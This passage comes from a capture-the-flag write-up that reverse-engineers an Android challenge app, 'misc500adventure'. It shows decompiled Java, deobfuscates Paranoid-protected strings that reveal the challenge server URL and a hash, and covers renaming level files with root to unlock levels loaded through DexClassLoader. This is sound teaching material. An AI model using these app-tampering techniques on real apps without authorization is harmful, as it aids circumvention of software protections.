<span class="line"><span style="color:#4D9375">        return</span><span style="color:#BD976A"> str</span><span style="color:#666666">.</span><span style="color:#80A665">startsWith</span><span style="color:#666666">(</span><span style="color:#BD976A">g2</span><span style="color:#666666">.</span><span style="color:#80A665">toString</span><span style="color:#666666">());</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"><span style="color:#666666">}</span></span>
<span class="line"></span></code></pre>
<p>This piece of code lists the files under <code>/data/data/com.example.misc500adventure/app_LevelDir/</code>. Then, it iterates from <code>1</code> to <code>3</code> and filters the files by <code>new a(i2)</code>. Basically, if a file that starts with <code>Level0 + i</code> exists, it will enable the button.</p>
<p>So we need to rename <code>/data/data/com.example.misc500adventure/app_LevelDir/Level01.jar</code> to <code>/data/data/com.example.misc500adventure/app_LevelDir/Level01.apk</code> (using root</p>
<p>Still inside <code>com.example.misc500adventure.D</code> we can find the <code>onClick</code> method:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="java"><code><span class="line"><span style="color:#CB7676">public</span><span style="color:#CB7676"> void</span><span style="color:#80A665"> onClick</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">View view</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">    Intent</span><span style="color:#BD976A"> intent</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#DBD7CAEE">    String</span><span style="color:#BD976A"> str</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#4D9375">    switch</span><span style="color:#666666"> (</span><span style="color:#BD976A">view</span><span style="color:#666666">.</span><span style="color:#80A665">getId</span><span style="color:#666666">())</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">        case</span><span style="color:#BD976A"> R</span><span style="color:#666666">.</span><span style="color:#BD976A">id</span><span style="color:#666666">.</span><span style="color:#BD976A">button1</span><span style="color:#758575DD"> /* 2131230822 */</span><span style="color:#4D9375">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">            intent </span><span style="color:#666666">=</span><span style="color:#4D9375"> new</span><span style="color:#80A665"> Intent</span><span style="color:#666666">(</span><span style="color:#BD976A">view</span><span style="color:#666666">.</span><span style="color:#80A665">getContext</span><span style="color:#666666">(),</span><span style="color:#BD976A"> C</span><span style="color:#666666">.</span><span style="color:#BD976A">class</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#DBD7CAEE">            str </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Level01</span><span style="color:#C98A7D77">"</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#4D9375">            break</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#4D9375">        case</span><span style="color:#BD976A"> R</span><span style="color:#666666">.</span><span style="color:#BD976A">id</span><span style="color:#666666">.</span><span style="color:#BD976A">button2</span><span style="color:#758575DD"> /* 2131230823 */</span><span style="color:#4D9375">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">            intent </span><span style="color:#666666">=</span><span style="color:#4D9375"> new</span><span style="color:#80A665"> Intent</span><span style="color:#666666">(</span><span style="color:#BD976A">view</span><span style="color:#666666">.</span><span style="color:#80A665">getContext</span><span style="color:#666666">(),</span><span style="color:#BD976A"> C</span><span style="color:#666666">.</span><span style="color:#BD976A">class</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#DBD7CAEE">            str </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Level02</span><span style="color:#C98A7D77">"</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#4D9375">            break</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#4D9375">        case</span><span style="color:#BD976A"> R</span><span style="color:#666666">.</span><span style="color:#BD976A">id</span><span style="color:#666666">.</span><span style="color:#BD976A">button3</span><span style="color:#758575DD"> /* 2131230824 */</span><span style="color:#4D9375">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">            intent </span><span style="color:#666666">=</span><span style="color:#4D9375"> new</span><span style="color:#80A665"> Intent</span><span style="color:#666666">(</span><span style="color:#BD976A">view</span><span style="color:#666666">.</span><span style="color:#80A665">getContext</span><span style="color:#666666">(),</span><span style="color:#BD976A"> C</span><span style="color:#666666">.</span><span style="color:#BD976A">class</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#DBD7CAEE">            str </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Level03</span><span style="color:#C98A7D77">"</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#4D9375">            break</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#4D9375">        default:</span></span>
<span class="line"><span style="color:#4D9375">            return</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"><span style="color:#BD976A">    intent</span><span style="color:#666666">.</span><span style="color:#80A665">putExtra</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">LevelNumber</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> str</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">    view</span><span style="color:#666666">.</span><span style="color:#80A665">getContext</span><span style="color:#666666">().</span><span style="color:#80A665">startActivity</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">intent</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#666666">}</span></span>
<span class="line"></span></code></pre>
<p>When you click a button, it will start the new activity <code>C</code> with an extra <code>LevelNumber</code> based on the button you clicked.</p>
<p>Let’s dive into <code>com.example.misc500adventure.C</code>:</p>
<p>Oh no, there are no strings! Most probably they obfuscated this class.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="java"><code><span class="line"><span style="color:#CB7676">public</span><span style="color:#DBD7CAEE"> String</span><span style="color:#BD976A"> f1853o</span><span style="color:#666666"> =</span><span style="color:#BD976A"> e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">40074581078310L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#CB7676">public</span><span style="color:#DBD7CAEE"> String</span><span style="color:#BD976A"> f1855q</span><span style="color:#666666"> =</span><span style="color:#BD976A"> e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">40078876045606L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#CB7676">public</span><span style="color:#DBD7CAEE"> String</span><span style="color:#BD976A"> f1856r</span><span style="color:#666666"> =</span><span style="color:#BD976A"> e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">40065991143718L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#CB7676">public</span><span style="color:#DBD7CAEE"> String</span><span style="color:#BD976A"> f1857s</span><span style="color:#666666"> =</span><span style="color:#BD976A"> e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">40070286111014L</span><span style="color:#666666">);</span></span>
<span class="line"></span></code></pre>
<p>Based on our experience, we can quickly tell that it’s obfuscated with <a href="https://github.com/MichaelRocks/paranoid">Paranoid</a>, but it can be easily deobfuscated with <a href="https://github.com/giacomoferretti/paranoid-deobfuscator">paranoid-deobfuscator</a>. We can get a deobfuscated APK with this tool.</p>
<p>The strings were:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>b''</span></span>
<span class="line"><span>b''</span></span>
<span class="line"><span>b''</span></span>
<span class="line"><span>b'ab396cd2b1d8a7d4fb5c1e137224004a0261976d'</span></span>
<span class="line"><span>b'gameStory'</span></span>
<span class="line"><span>b''</span></span>
<span class="line"><span>b''</span></span>
<span class="line"><span>b''</span></span>
<span class="line"><span>b'response'</span></span>
<span class="line"><span>b'endpoint'</span></span>
<span class="line"><span>b'SUCCEDED:'</span></span>
<span class="line"><span>b'LevelCompleted'</span></span>
<span class="line"><span>b'Status'</span></span>
<span class="line"><span>b'Return to main menu'</span></span>
<span class="line"><span>b''</span></span>
<span class="line"><span>b'Level03'</span></span>
<span class="line"><span>b'Level02'</span></span>
<span class="line"><span>b'Level01'</span></span>
<span class="line"><span>b'SecretEnding.zip'</span></span>
<span class="line"><span>b'Level03.apk'</span></span>
<span class="line"><span>b''</span></span>
<span class="line"><span>b'Level02.apk'</span></span>
<span class="line"><span>b''</span></span>
<span class="line"><span>b'DEAD:'</span></span>
<span class="line"><span>b'Common Error'</span></span>
<span class="line"><span>b'Settings'</span></span>
<span class="line"><span>b'http://gamebox1.reply.it/870af13cd49ecc64128cfb08b87a362c7e918f8a/'</span></span>
<span class="line"><span>b'LevelNumber'</span></span>
<span class="line"><span>b'com.example.'</span></span>
<span class="line"><span>b'.'</span></span>
<span class="line"><span>b'returnFirstOption'</span></span>
<span class="line"><span>b'returnSecondOption'</span></span>
<span class="line"><span>b'returnThirdOption'</span></span>
<span class="line"><span>b'returnFourthOption'</span></span>
<span class="line"><span>b'returnQuestImage'</span></span>
<span class="line"><span>b'returnStory'</span></span>
<span class="line"><span>b'LevelDir'</span></span>
<span class="line"><span>b'LevelDir'</span></span>
<span class="line"><span>b'/'</span></span>
<span class="line"><span>b'.apk'</span></span>
<span class="line"><span>b'drawable'</span></span>
<span class="line"><span>b'Level03'</span></span>
<span class="line"><span>b'The level seems to be broken... How pity! Maybe you should try to fix it.'</span></span>
<span class="line"><span></span></span></code></pre>
<p>The gamebox URL, <code>ab396cd2b1d8a7d4fb5c1e137224004a0261976d</code> and <code>SecretEnding.zip</code> seems promising. We’ve also found <code>The level seems to be broken... How pity! Maybe you should try to fix it.</code>, the error message we got in the beginning.</p>
<p>Now with the deobfuscated APK we can work better.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="java"><code><span class="line"><span style="color:#CB7676">public</span><span style="color:#CB7676"> final</span><span style="color:#CB7676"> void</span><span style="color:#80A665"> onCreate</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">Bundle bundle</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">    TextView</span><span style="color:#BD976A"> textView</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#CB7676">    long</span><span style="color:#BD976A"> j2</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#C99076">    super</span><span style="color:#666666">.</span><span style="color:#80A665">onCreate</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">bundle</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#80A665">    setContentView</span><span style="color:#666666">(</span><span style="color:#BD976A">R</span><span style="color:#666666">.</span><span style="color:#BD976A">layout</span><span style="color:#666666">.</span><span style="color:#BD976A">activity_a</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#DBD7CAEE">    Context</span><span style="color:#BD976A"> applicationContext</span><span style="color:#666666"> =</span><span style="color:#80A665"> getApplicationContext</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#BD976A">    e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">39988681732390L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">    applicationContext</span><span style="color:#666666">.</span><span style="color:#80A665">getSharedPreferences</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Settings</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">    e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">39889897484582L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#C99076">    this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1855q</span><span style="color:#666666"> =</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">http://gamebox1.reply.it/870af13cd49ecc64128cfb08b87a362c7e918f8a/</span><span style="color:#C98A7D77">"</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#C99076">    this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1856r</span><span style="color:#666666"> =</span><span style="color:#C99076"> this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1855q</span><span style="color:#CB7676"> +</span><span style="color:#C99076"> this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1857s</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#C99076">    this</span><span style="color:#666666">.</span><span style="color:#BD976A">t</span><span style="color:#666666"> =</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">ImageView</span><span style="color:#666666">)</span><span style="color:#80A665"> findViewById</span><span style="color:#666666">(</span><span style="color:#BD976A">R</span><span style="color:#666666">.</span><span style="color:#BD976A">id</span><span style="color:#666666">.</span><span style="color:#BD976A">imageViewStory</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#C99076">    this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1858u</span><span style="color:#666666"> =</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">TextView</span><span style="color:#666666">)</span><span style="color:#80A665"> findViewById</span><span style="color:#666666">(</span><span style="color:#BD976A">R</span><span style="color:#666666">.</span><span style="color:#BD976A">id</span><span style="color:#666666">.</span><span style="color:#BD976A">textView</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#DBD7CAEE">    Intent</span><span style="color:#BD976A"> intent</span><span style="color:#666666"> =</span><span style="color:#80A665"> getIntent</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#BD976A">    e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">39627904479526L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#C99076">    this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1853o</span><span style="color:#666666"> =</span><span style="color:#BD976A"> intent</span><span style="color:#666666">.</span><span style="color:#80A665">getStringExtra</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">LevelNumber</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#DBD7CAEE">    StringBuilder</span><span style="color:#BD976A"> sb</span><span style="color:#666666"> =</span><span style="color:#4D9375"> new</span><span style="color:#80A665"> StringBuilder</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#BD976A">    e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">40641516761382L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">    sb</span><span style="color:#666666">.</span><span style="color:#80A665">append</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">com.example.</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">    sb</span><span style="color:#666666">.</span><span style="color:#80A665">append</span><span style="color:#666666">(</span><span style="color:#C99076">this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1853o</span><span style="color:#666666">.</span><span style="color:#80A665">toLowerCase</span><span style="color:#666666">(</span><span style="color:#BD976A">Locale</span><span style="color:#666666">.</span><span style="color:#BD976A">ROOT</span><span style="color:#666666">));</span></span>
<span class="line"><span style="color:#BD976A">    e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">40559912382758L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">    sb</span><span style="color:#666666">.</span><span style="color:#80A665">append</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">.</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">    sb</span><span style="color:#666666">.</span><span style="color:#80A665">append</span><span style="color:#666666">(</span><span style="color:#C99076">this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1853o</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#DBD7CAEE">    String</span><span style="color:#BD976A"> sb2</span><span style="color:#666666"> =</span><span style="color:#BD976A"> sb</span><span style="color:#666666">.</span><span style="color:#80A665">toString</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#BD976A">    e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">40551322448166L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">    e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">40508372775206L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">    e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">40452538200358L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">    e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">40375228789030L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">    e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">40336574083366L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">    e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">40254969704742L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">    e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">40169070358822L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#DBD7CAEE">    File</span><span style="color:#BD976A"> dir</span><span style="color:#666666"> =</span><span style="color:#80A665"> getDir</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">LevelDir</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#DBD7CAEE">    StringBuilder</span><span style="color:#BD976A"> sb3</span><span style="color:#666666"> =</span><span style="color:#4D9375"> new</span><span style="color:#80A665"> StringBuilder</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#BD976A">    e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">41169797738790L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">    sb3</span><span style="color:#666666">.</span><span style="color:#80A665">append</span><span style="color:#666666">(</span><span style="color:#80A665">getDir</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">LevelDir</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">).</span><span style="color:#80A665">getAbsolutePath</span><span style="color:#666666">());</span></span>
<span class="line"><span style="color:#BD976A">    e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">41225632313638L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">    sb3</span><span style="color:#666666">.</span><span style="color:#80A665">append</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">    sb3</span><span style="color:#666666">.</span><span style="color:#80A665">append</span><span style="color:#666666">(</span><span style="color:#C99076">this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1853o</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">    e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">41217042379046L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">    sb3</span><span style="color:#666666">.</span><span style="color:#80A665">append</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">.apk</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#DBD7CAEE">    String</span><span style="color:#BD976A"> sb4</span><span style="color:#666666"> =</span><span style="color:#BD976A"> sb3</span><span style="color:#666666">.</span><span style="color:#80A665">toString</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#666666"> (</span><span style="color:#CB7676">!</span><span style="color:#4D9375">new</span><span style="color:#80A665"> File</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">sb4</span><span style="color:#666666">).</span><span style="color:#80A665">exists</span><span style="color:#666666">())</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">        String</span><span style="color:#BD976A"> str</span><span style="color:#666666"> =</span><span style="color:#C99076"> this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1853o</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#BD976A">        e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">41156912836902L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#666666"> (</span><span style="color:#BD976A">str</span><span style="color:#666666">.</span><span style="color:#80A665">equals</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Level03</span><span style="color:#C98A7D77">"</span><span style="color:#666666">))</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">            textView </span><span style="color:#666666">=</span><span style="color:#C99076"> this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1858u</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#DBD7CAEE">            j2 </span><span style="color:#666666">=</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">41053833621798L</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">        }</span><span style="color:#4D9375"> else</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">            textView </span><span style="color:#666666">=</span><span style="color:#C99076"> this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1858u</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#DBD7CAEE">            j2 </span><span style="color:#666666">=</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">40774660747558L</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">        }</span></span>
<span class="line"><span style="color:#BD976A">        e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">j2</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">        textView</span><span style="color:#666666">.</span><span style="color:#80A665">setText</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">The level seems to be broken... How pity! Maybe you should try to fix it.</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"><span style="color:#4D9375">    try</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">        Class</span><span style="color:#666666">&#x3C;</span><span style="color:#CB7676">?</span><span style="color:#666666">></span><span style="color:#BD976A"> loadClass</span><span style="color:#666666"> =</span><span style="color:#4D9375"> new</span><span style="color:#80A665"> DexClassLoader</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">sb4</span><span style="color:#666666">,</span><span style="color:#BD976A"> dir</span><span style="color:#666666">.</span><span style="color:#80A665">getAbsolutePath</span><span style="color:#666666">(),</span><span style="color:#4D9375"> null</span><span style="color:#666666">,</span><span style="color:#BD976A"> ClassLoader</span><span style="color:#666666">.</span><span style="color:#80A665">getSystemClassLoader</span><span style="color:#666666">().</span><span style="color:#80A665">getParent</span><span style="color:#666666">()).</span><span style="color:#80A665">loadClass</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">sb2</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#C99076">        this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1854p</span><span style="color:#666666"> =</span><span style="color:#DBD7CAEE"> loadClass</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#DBD7CAEE">        Object</span><span style="color:#BD976A"> newInstance</span><span style="color:#666666"> =</span><span style="color:#BD976A"> loadClass</span><span style="color:#666666">.</span><span style="color:#80A665">newInstance</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#DBD7CAEE">        Button</span><span style="color:#BD976A"> button</span><span style="color:#666666"> =</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">Button</span><span style="color:#666666">)</span><span style="color:#80A665"> findViewById</span><span style="color:#666666">(</span><span style="color:#BD976A">R</span><span style="color:#666666">.</span><span style="color:#BD976A">id</span><span style="color:#666666">.</span><span style="color:#BD976A">button1</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">        button</span><span style="color:#666666">.</span><span style="color:#80A665">setText</span><span style="color:#666666">((</span><span style="color:#DBD7CAEE">String</span><span style="color:#666666">)</span><span style="color:#C99076"> this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1854p</span><span style="color:#666666">.</span><span style="color:#80A665">getMethod</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">returnFirstOption</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4D9375"> new</span><span style="color:#CB7676"> Class</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">]).</span><span style="color:#80A665">invoke</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">newInstance</span><span style="color:#666666">,</span><span style="color:#4D9375"> new</span><span style="color:#CB7676"> Object</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">]));</span></span>
<span class="line"><span style="color:#DBD7CAEE">        Button</span><span style="color:#BD976A"> button2</span><span style="color:#666666"> =</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">Button</span><span style="color:#666666">)</span><span style="color:#80A665"> findViewById</span><span style="color:#666666">(</span><span style="color:#BD976A">R</span><span style="color:#666666">.</span><span style="color:#BD976A">id</span><span style="color:#666666">.</span><span style="color:#BD976A">button2</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">        button2</span><span style="color:#666666">.</span><span style="color:#80A665">setText</span><span style="color:#666666">((</span><span style="color:#DBD7CAEE">String</span><span style="color:#666666">)</span><span style="color:#C99076"> this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1854p</span><span style="color:#666666">.</span><span style="color:#80A665">getMethod</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">returnSecondOption</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4D9375"> new</span><span style="color:#CB7676"> Class</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">]).</span><span style="color:#80A665">invoke</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">newInstance</span><span style="color:#666666">,</span><span style="color:#4D9375"> new</span><span style="color:#CB7676"> Object</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">]));</span></span>
<span class="line"><span style="color:#DBD7CAEE">        Button</span><span style="color:#BD976A"> button3</span><span style="color:#666666"> =</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">Button</span><span style="color:#666666">)</span><span style="color:#80A665"> findViewById</span><span style="color:#666666">(</span><span style="color:#BD976A">R</span><span style="color:#666666">.</span><span style="color:#BD976A">id</span><span style="color:#666666">.</span><span style="color:#BD976A">button3</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">        button3</span><span style="color:#666666">.</span><span style="color:#80A665">setText</span><span style="color:#666666">((</span><span style="color:#DBD7CAEE">String</span><span style="color:#666666">)</span><span style="color:#C99076"> this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1854p</span><span style="color:#666666">.</span><span style="color:#80A665">getMethod</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">returnThirdOption</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4D9375"> new</span><span style="color:#CB7676"> Class</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">]).</span><span style="color:#80A665">invoke</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">newInstance</span><span style="color:#666666">,</span><span style="color:#4D9375"> new</span><span style="color:#CB7676"> Object</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">]));</span></span>
